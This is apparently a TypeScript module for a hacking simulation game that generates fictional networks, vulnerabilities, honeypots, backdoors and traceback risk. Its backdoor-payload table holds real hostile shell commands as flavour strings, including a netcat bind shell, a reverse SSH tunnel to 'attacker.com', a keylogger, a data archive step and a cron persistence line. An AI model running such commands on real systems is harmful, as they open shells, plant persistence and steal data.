import { GameState } from '../types/game';

export interface NetworkNode {
  id: string;
  name: string;
  type: 'server' | 'workstation' | 'router' | 'firewall' | 'database' | 'honeypot' | 'admin_panel';
  ip: string;
  ports: NetworkPort[];
  security: SecurityLevel;
  compromised: boolean;
  backdoors: Backdoor[];
  connections: string[]; // Connected node IDs
  data: NetworkData[];
  lastAccessed: number;
  alertLevel: number; // 0-100
  patchLevel: number; // 0-100, higher = more secure
  position: { x: number; y: number };
}

export interface NetworkPort {
  number: number;
  service: string;
  status: 'open' | 'closed' | 'filtered';
  vulnerability?: Vulnerability;
  banner?: string;
}

export interface Vulnerability {
  id: string;
  type: 'buffer_overflow' | 'sql_injection' | 'xss' | 'privilege_escalation' | 'rce' | 'dos';
  severity: 'low' | 'medium' | 'high' | 'critical';
  cve?: string;
  description: string;
  exploitDifficulty: number; // 1-10
  patchable: boolean;
}

export interface SecurityLevel {
  encryption: number; // 0-100
  authentication: 'none' | 'basic' | 'strong' | 'multi_factor';
  monitoring: number; // 0-100
  firewall: boolean;
  ids: boolean; // Intrusion Detection System
  honeypots: number;
}

export interface Backdoor {
  id: string;
  type: 'shell' | 'tunnel' | 'keylogger' | 'data_exfil' | 'persistence';
  installTime: number;
  lastUsed: number;
  discoveryRisk: number; // 0-100, increases over time
  active: boolean;
  payload: string;
  triggerCondition?: string;
}

export interface NetworkData {
  id: string;
  type: 'credentials' | 'financial' | 'personal' | 'corporate' | 'classified' | 'research';
  value: number; // Credits value
  size: number; // MB
  encrypted: boolean;
  sensitivity: 'public' | 'internal' | 'confidential' | 'secret' | 'top_secret';
  description: string;
}

export interface TracebackEvent {
  id: string;
  timestamp: number;
  sourceIP: string;
  targetNode: string;
  action: string;
  suspicionGenerated: number;
  detected: boolean;
  evidence: string[];
}

export interface NetworkMap {
  id: string;
  name: string;
  nodes: Record<string, NetworkNode>;
  subnets: NetworkSubnet[];
  tracebackEvents: TracebackEvent[];
  globalAlertLevel: number;
  lastScan: number;
  difficulty: 'easy' | 'medium' | 'hard' | 'expert';
}

export interface NetworkSubnet {
  id: string;
  name: string;
  cidr: string;
  nodeIds: string[];
  security: SecurityLevel;
  isolated: boolean;
}

export interface HackingSession {
  id: string;
  networkId: string;
  startTime: number;
  currentNode?: string;
  commandHistory: SessionCommand[];
  suspicionLevel: number;
  compromisedNodes: string[];
  discoveredNodes: string[];
  activeBackdoors: string[];
  tracebackRisk: number;
}

export interface SessionCommand {
  command: string;
  timestamp: number;
  nodeId: string;
  success: boolean;
  suspicionGenerated: number;
  timeSpent: number;
}

export class DynamicNetworkSystem {
  private networks: Map<string, NetworkMap> = new Map();
  private activeSessions: Map<string, HackingSession> = new Map();

  // Generate a procedural network
  generateNetwork(difficulty: 'easy' | 'medium' | 'hard' | 'expert', size: number = 10): NetworkMap {
    const networkId = `network_${Date.now()}`;
    const network: NetworkMap = {
      id: networkId,
      name: this.generateNetworkName(),
      nodes: {},
      subnets: [],
      tracebackEvents: [],
      globalAlertLevel: 0,
      lastScan: 0,
      difficulty
    };

    // Generate nodes
    const nodes = this.generateNodes(size, difficulty);
    nodes.forEach(node => {
      network.nodes[node.id] = node;
    });

    // Generate connections
    this.generateConnections(network);

    // Generate subnets
    network.subnets = this.generateSubnets(network);

    // Place honeypots
    this.placeHoneypots(network, difficulty);

    this.networks.set(networkId, network);
    return network;
  }

  private generateNetworkName(): string {
    const prefixes = ['Corp', 'Secure', 'Data', 'Cyber', 'Net', 'Info', 'Tech', 'Digital'];
    const suffixes = ['Systems', 'Network', 'Infrastructure', 'Grid', 'Hub', 'Core', 'Base'];
    const prefix = prefixes[Math.floor(Math.random() * prefixes.length)];
    const suffix = suffixes[Math.floor(Math.random() * suffixes.length)];
    return `${prefix}${suffix}`;
  }

  private generateNodes(count: number, difficulty: string): NetworkNode[] {
    const nodes: NetworkNode[] = [];
    const nodeTypes: NetworkNode['type'][] = ['server', 'workstation', 'router', 'firewall', 'database', 'admin_panel'];
    
    for (let i = 0; i < count; i++) {
      const nodeType = nodeTypes[Math.floor(Math.random() * nodeTypes.length)];
      const node: NetworkNode = {
        id: `node_${i}`,
        name: this.generateNodeName(nodeType),
        type: nodeType,
        ip: this.generateIP(),
        ports: this.generatePorts(nodeType, difficulty),
        security: this.generateSecurity(nodeType, difficulty),
        compromised: false,
        backdoors: [],
        connections: [],
        data: this.generateData(nodeType),
        lastAccessed: 0,
        alertLevel: 0,
        patchLevel: this.getPatchLevel(difficulty),
        position: { x: Math.random() * 800, y: Math.random() * 600 }
      };
      nodes.push(node);
    }

    return nodes;
  }

  private generateNodeName(type: NetworkNode['type']): string {
    const names: Record<NetworkNode['type'], string[]> = {
      server: ['WebServer', 'MailServer', 'FileServer', 'AppServer', 'BackupServer'],
      workstation: ['DevWorkstation', 'AdminPC', 'UserPC', 'TestMachine', 'AnalystPC'],
      router: ['CoreRouter', 'EdgeRouter', 'AccessRouter', 'BorderRouter'],
      firewall: ['MainFirewall', 'DMZFirewall', 'InternalFW', 'EdgeFW'],
      database: ['UserDB', 'FinanceDB', 'LogDB', 'BackupDB', 'AnalyticsDB'],
      admin_panel: ['AdminConsole', 'ManagementPanel', 'ControlCenter', 'MonitoringDash'],
      honeypot: ['HoneyTrap', 'FakeServer', 'DecoySystem', 'TrapNode']
    };
    
    const typeNames = names[type];
    return typeNames[Math.floor(Math.random() * typeNames.length)];
  }

  private generateIP(): string {
    const subnets = ['192.168.1', '10.0.0', '172.16.0', '192.168.100'];
    const subnet = subnets[Math.floor(Math.random() * subnets.length)];
    const host = Math.floor(Math.random() * 254) + 1;
    return `${subnet}.${host}`;
  }

  private generatePorts(nodeType: NetworkNode['type'], difficulty: string): NetworkPort[] {
    const commonPorts = [22, 23, 25, 53, 80, 110, 143, 443, 993, 995];
    const servicePorts: Record<NetworkNode['type'], number[]> = {
      server: [80, 443, 8080, 8443, 3000, 5000],
      workstation: [22, 3389, 5900, 5901],
      router: [22, 23, 80, 443, 161],
      firewall: [22, 80, 443, 8080],
      database: [1433, 3306, 5432, 1521, 27017],
      admin_panel: [80, 443, 8080, 9090, 10000],
      honeypot: [22, 80, 443, 21, 23, 25]
    };

    const ports: NetworkPort[] = [];
    const typePorts = servicePorts[nodeType] || commonPorts;
    const portCount = Math.floor(Math.random() * 5) + 3;

    for (let i = 0; i < portCount; i++) {
      const portNum = typePorts[Math.floor(Math.random() * typePorts.length)];
      if (ports.find(p => p.number === portNum)) continue;

      const port: NetworkPort = {
        number: portNum,
        service: this.getServiceName(portNum),
        status: Math.random() > 0.3 ? 'open' : 'closed',
        banner: this.generateBanner(portNum)
      };

      // Add vulnerabilities based on difficulty
      if (port.status === 'open' && Math.random() < this.getVulnProbability(difficulty)) {
        port.vulnerability = this.generateVulnerability(difficulty);
      }

      ports.push(port);
    }

    return ports;
  }

  private getServiceName(port: number): string {
    const services: Record<number, string> = {
      22: 'SSH',
      23: 'Telnet',
      25: 'SMTP',
      53: 'DNS',
      80: 'HTTP',
      110: 'POP3',
      143: 'IMAP',
      443: 'HTTPS',
      993: 'IMAPS',
      995: 'POP3S',
      1433: 'MSSQL',
      3306: 'MySQL',
      3389: 'RDP',
      5432: 'PostgreSQL',
      5900: 'VNC',
      8080: 'HTTP-Alt',
      27017: 'MongoDB'
    };
    return services[port] || 'Unknown';
  }

  private generateBanner(port: number): string {
    const banners: Record<number, string[]> = {
      22: ['OpenSSH 7.4', 'OpenSSH 8.0', 'Dropbear SSH'],
      80: ['Apache/2.4.41', 'nginx/1.18.0', 'IIS/10.0'],
      443: ['Apache/2.4.41 (Ubuntu)', 'nginx/1.18.0', 'Microsoft-IIS/10.0'],
      3306: ['MySQL 5.7.32', 'MySQL 8.0.21', 'MariaDB 10.3.25']
    };
    
    const portBanners = banners[port];
    if (portBanners) {
      return portBanners[Math.floor(Math.random() * portBanners.length)];
    }
    return `Service on port ${port}`;
  }

  private getVulnProbability(difficulty: string): number {
    const probabilities: Record<string, number> = {
      easy: 0.8,
      medium: 0.6,
      hard: 0.4,
      expert: 0.3
    };
    return probabilities[difficulty] || 0.5;
  }

  private generateVulnerability(difficulty: string): Vulnerability {
    const vulnTypes: Vulnerability['type'][] = ['buffer_overflow', 'sql_injection', 'xss', 'privilege_escalation', 'rce', 'dos'];
    const severities: Vulnerability['severity'][] = ['low', 'medium', 'high', 'critical'];
    
    const type = vulnTypes[Math.floor(Math.random() * vulnTypes.length)];
    const severity = severities[Math.floor(Math.random() * severities.length)];
    
    const difficultyModifier: Record<string, number> = {
      easy: -2,
      medium: 0,
      hard: 2,
      expert: 4
    };

    return {
      id: `vuln_${Date.now()}_${Math.random()}`,
      type,
      severity,
      cve: `CVE-2023-${Math.floor(Math.random() * 9999).toString().padStart(4, '0')}`,
      description: this.getVulnDescription(type, severity),
      exploitDifficulty: Math.max(1, Math.min(10, 5 + (difficultyModifier[difficulty] || 0) + Math.floor(Math.random() * 3))),
      patchable: Math.random() > 0.2
    };
  }

  private getVulnDescription(type: Vulnerability['type'], severity: Vulnerability['severity']): string {
    const descriptions = {
      buffer_overflow: `${severity} buffer overflow vulnerability allowing code execution`,
      sql_injection: `${severity} SQL injection vulnerability in database queries`,
      xss: `${severity} cross-site scripting vulnerability`,
      privilege_escalation: `${severity} privilege escalation vulnerability`,
      rce: `${severity} remote code execution vulnerability`,
      dos: `${severity} denial of service vulnerability`
    };
    return descriptions[type];
  }

  private generateSecurity(nodeType: NetworkNode['type'], difficulty: string): SecurityLevel {
    const baseSecurityLevels: Record<string, { encryption: number; monitoring: number }> = {
      easy: { encryption: 30, monitoring: 20 },
      medium: { encryption: 50, monitoring: 40 },
      hard: { encryption: 70, monitoring: 60 },
      expert: { encryption: 85, monitoring: 80 }
    };

    const base = baseSecurityLevels[difficulty] || { encryption: 50, monitoring: 40 };
    const variation = Math.floor(Math.random() * 20) - 10;

    return {
      encryption: Math.max(0, Math.min(100, base.encryption + variation)),
      authentication: this.getAuthLevel(nodeType, difficulty),
      monitoring: Math.max(0, Math.min(100, base.monitoring + variation)),
      firewall: nodeType === 'firewall' || Math.random() > 0.6,
      ids: difficulty !== 'easy' && Math.random() > 0.5,
      honeypots: Math.floor(Math.random() * 3)
    };
  }

  private getAuthLevel(nodeType: NetworkNode['type'], difficulty: string): SecurityLevel['authentication'] {
    const authLevels: SecurityLevel['authentication'][] = ['none', 'basic', 'strong', 'multi_factor'];
    const typeModifiers: Record<NetworkNode['type'], number> = {
      admin_panel: 2,
      database: 1,
      server: 1,
      firewall: 2,
      router: 1,
      workstation: 0,
      honeypot: 0
    };

    const difficultyModifiers: Record<string, number> = {
      easy: 0,
      medium: 1,
      hard: 2,
      expert: 3
    };

    const index = Math.min(3, Math.max(0, 
      Math.floor(Math.random() * 2) + 
      (typeModifiers[nodeType] || 0) + 
      (difficultyModifiers[difficulty] || 0) - 1
    ));

    return authLevels[index];
  }

  private getPatchLevel(difficulty: string): number {
    const baseLevels: Record<string, number> = {
      easy: 40,
      medium: 60,
      hard: 75,
      expert: 85
    };
    const variation = Math.floor(Math.random() * 20) - 10;
    return Math.max(0, Math.min(100, (baseLevels[difficulty] || 60) + variation));
  }

  private generateData(nodeType: NetworkNode['type']): NetworkData[] {
    const dataTypes: NetworkData['type'][] = ['credentials', 'financial', 'personal', 'corporate', 'classified', 'research'];
    const data: NetworkData[] = [];
    const dataCount = Math.floor(Math.random() * 5) + 1;

    for (let i = 0; i < dataCount; i++) {
      const type = dataTypes[Math.floor(Math.random() * dataTypes.length)];
      const dataItem: NetworkData = {
        id: `data_${Date.now()}_${i}`,
        type,
        value: this.getDataValue(type),
        size: Math.floor(Math.random() * 1000) + 10,
        encrypted: Math.random() > 0.4,
        sensitivity: this.getDataSensitivity(type),
        description: this.getDataDescription(type)
      };
      data.push(dataItem);
    }

    return data;
  }

  private getDataValue(type: NetworkData['type']): number {
    const baseValues = {
      credentials: 500,
      financial: 2000,
      personal: 300,
      corporate: 1000,
      classified: 5000,
      research: 1500
    };
    const base = baseValues[type];
    const variation = Math.floor(Math.random() * base * 0.5);
    return base + variation;
  }

  private getDataSensitivity(type: NetworkData['type']): NetworkData['sensitivity'] {
    const sensitivities = {
      credentials: 'confidential',
      financial: 'secret',
      personal: 'internal',
      corporate: 'confidential',
      classified: 'top_secret',
      research: 'confidential'
    };
    return sensitivities[type] as NetworkData['sensitivity'];
  }

  private getDataDescription(type: NetworkData['type']): string {
    const descriptions = {
      credentials: 'User login credentials and access tokens',
      financial: 'Financial records and transaction data',
      personal: 'Personal information and contact details',
      corporate: 'Corporate documents and business data',
      classified: 'Classified government or military information',
      research: 'Research data and intellectual property'
    };
    return descriptions[type];
  }

  private generateConnections(network: NetworkMap): void {
    const nodeIds = Object.keys(network.nodes);
    
    // Ensure network connectivity
    for (let i = 0; i < nodeIds.length - 1; i++) {
      const currentId = nodeIds[i];
      const nextId = nodeIds[i + 1];
      
      network.nodes[currentId].connections.push(nextId);
      network.nodes[nextId].connections.push(currentId);
    }

    // Add additional random connections
    const additionalConnections = Math.floor(nodeIds.length * 0.3);
    for (let i = 0; i < additionalConnections; i++) {
      const node1 = nodeIds[Math.floor(Math.random() * nodeIds.length)];
      const node2 = nodeIds[Math.floor(Math.random() * nodeIds.length)];
      
      if (node1 !== node2 && !network.nodes[node1].connections.includes(node2)) {
        network.nodes[node1].connections.push(node2);
        network.nodes[node2].connections.push(node1);
      }
    }
  }

  private generateSubnets(network: NetworkMap): NetworkSubnet[] {
    const subnets: NetworkSubnet[] = [];
    const nodeIds = Object.keys(network.nodes);
    const subnetCount = Math.max(2, Math.floor(nodeIds.length / 4));

    for (let i = 0; i < subnetCount; i++) {
      const subnet: NetworkSubnet = {
        id: `subnet_${i}`,
        name: `Subnet_${i + 1}`,
        cidr: `192.168.${i + 1}.0/24`,
        nodeIds: [],
        security: this.generateSecurity('server', network.difficulty),
        isolated: Math.random() > 0.7
      };

      // Assign nodes to subnets
      const nodesPerSubnet = Math.floor(nodeIds.length / subnetCount);
      const startIndex = i * nodesPerSubnet;
      const endIndex = i === subnetCount - 1 ? nodeIds.length : startIndex + nodesPerSubnet;
      
      subnet.nodeIds = nodeIds.slice(startIndex, endIndex);
      subnets.push(subnet);
    }

    return subnets;
  }

  private placeHoneypots(network: NetworkMap, difficulty: string): void {
    const honeypotCount = Math.floor(Object.keys(network.nodes).length * 0.1);
    const nodeIds = Object.keys(network.nodes);

    for (let i = 0; i < honeypotCount; i++) {
      const randomNodeId = nodeIds[Math.floor(Math.random() * nodeIds.length)];
      const node = network.nodes[randomNodeId];
      
      if (node.type !== 'honeypot') {
        // Convert node to honeypot
        const honeypot: NetworkNode = {
          ...node,
          type: 'honeypot',
          name: `Honeypot_${node.name}`,
          security: {
            ...node.security,
            monitoring: 100,
            ids: true
          }
        };
        network.nodes[randomNodeId] = honeypot;
      }
    }
  }

  // Install backdoor on compromised node
  installBackdoor(networkId: string, nodeId: string, backdoorType: Backdoor['type']): Backdoor {
    const network = this.networks.get(networkId);
    if (!network) throw new Error('Network not found');

    const node = network.nodes[nodeId];
    if (!node) throw new Error('Node not found');
    if (!node.compromised) throw new Error('Node not compromised');

    const backdoor: Backdoor = {
      id: `backdoor_${Date.now()}`,
      type: backdoorType,
      installTime: Date.now(),
      lastUsed: Date.now(),
      discoveryRisk: 10,
      active: true,
      payload: this.generateBackdoorPayload(backdoorType),
      triggerCondition: backdoorType === 'persistence' ? 'system_reboot' : undefined
    };

    node.backdoors.push(backdoor);
    return backdoor;
  }

  private generateBackdoorPayload(type: Backdoor['type']): string {
    const payloads = {
      shell: 'nc -l -p 4444 -e /bin/bash',
      tunnel: 'ssh -R 8080:localhost:80 user@attacker.com',
      keylogger: 'python keylogger.py > /tmp/.keys',
      data_exfil: 'tar -czf /tmp/data.tar.gz /home/user/documents',
      persistence: 'echo "* * * * * /tmp/backdoor.sh" | crontab -'
    };
    return payloads[type];
  }

  // Simulate AI patching and discovery
  simulateAIDefense(networkId: string): void {
    const network = this.networks.get(networkId);
    if (!network) return;

    Object.values(network.nodes).forEach(node => {
      // Increase patch level over time
      if (Math.random() < 0.1) {
        node.patchLevel = Math.min(100, node.patchLevel + Math.floor(Math.random() * 5) + 1);
      }

      // Check for backdoor discovery
      node.backdoors.forEach(backdoor => {
        if (backdoor.active) {
          // Increase discovery risk over time
          backdoor.discoveryRisk += Math.floor(Math.random() * 3) + 1;
          
          // Check if discovered
          if (Math.random() * 100 < backdoor.discoveryRisk) {
            backdoor.active = false;
            node.alertLevel = Math.min(100, node.alertLevel + 30);
            network.globalAlertLevel = Math.min(100, network.globalAlertLevel + 10);
          }
        }
      });

      // Patch vulnerabilities
      node.ports.forEach(port => {
        if (port.vulnerability && port.vulnerability.patchable && Math.random() < 0.05) {
          delete port.vulnerability;
        }
      });
    });
  }

  // Calculate traceback risk
  calculateTracebackRisk(sessionId: string): number {
    const session = this.activeSessions.get(sessionId);
    if (!session) return 0;

    let risk = 0;
    
    // Base risk from command volume
    risk += session.commandHistory.length * 2;
    
    // Risk from time spent
    const timeSpent = Date.now() - session.startTime;
    risk += Math.floor(timeSpent / 60000) * 5; // 5 points per minute
    
    // Risk from failed commands
    const failedCommands = session.commandHistory.filter(cmd => !cmd.success).length;
    risk += failedCommands * 10;
    
    // Risk from suspicion level
    risk += session.suspicionLevel;
    
    // Risk from compromised high-value nodes
    const network = this.networks.get(session.networkId);
    if (network) {
      session.compromisedNodes.forEach(nodeId => {
        const node = network.nodes[nodeId];
        if (node && (node.type === 'admin_panel' || node.type === 'database')) {
          risk += 20;
        }
      });
    }

    return Math.min(100, risk);
  }

  // Start hacking session
  startSession(networkId: string, playerId: string): HackingSession {
    const sessionId = `session_${Date.now()}_${playerId}`;
    const session: HackingSession = {
      id: sessionId,
      networkId,
      startTime: Date.now(),
      commandHistory: [],
      suspicionLevel: 0,
      compromisedNodes: [],
      discoveredNodes: [],
      activeBackdoors: [],
      tracebackRisk: 0
    };

    this.activeSessions.set(sessionId, session);
    return session;
  }

  // Record command in session
  recordCommand(sessionId: string, command: SessionCommand): void {
    const session = this.activeSessions.get(sessionId);
    if (!session) return;

    session.commandHistory.push(command);
    session.suspicionLevel += command.suspicionGenerated;
    session.tracebackRisk = this.calculateTracebackRisk(sessionId);

    // Add traceback event
    const network = this.networks.get(session.networkId);
    if (network) {
      const traceEvent: TracebackEvent = {
        id: `trace_${Date.now()}`,
        timestamp: Date.now(),
        sourceIP: '127.0.0.1', // Player's IP
        targetNode: command.nodeId,
        action: command.command,
        suspicionGenerated: command.suspicionGenerated,
        detected: command.suspicionGenerated > 20,
        evidence: command.success ? [] : ['failed_authentication', 'unusual_activity']
      };
      network.tracebackEvents.push(traceEvent);
    }
  }

  // Get network by ID
  getNetwork(networkId: string): NetworkMap | undefined {
    return this.networks.get(networkId);
  }

  // Get session by ID
  getSession(sessionId: string): HackingSession | undefined {
    return this.activeSessions.get(sessionId);
  }

  // Get all networks
  getAllNetworks(): NetworkMap[] {
    return Array.from(this.networks.values());
  }
}

// Export singleton instance
export const dynamicNetworkSystem = new DynamicNetworkSystem(); 